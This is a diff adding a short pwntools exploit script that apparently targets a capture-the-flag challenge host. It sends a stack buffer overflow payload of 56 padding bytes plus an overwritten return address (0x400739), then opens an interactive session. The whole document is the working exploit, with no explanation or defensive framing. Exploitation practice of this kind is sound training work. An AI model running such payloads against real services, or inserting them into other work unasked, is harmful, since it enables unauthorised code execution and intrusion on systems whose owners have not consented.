@@ -1,0 +1,9 @@
+from pwn import *
+
+p = remote("node2.hackingfor.fun","38618")
+addr = 0x400739
+
+payload = 'A'*(56)+p64(addr)
+print(payload)
+p.sendline(payload)
+p.interactive()
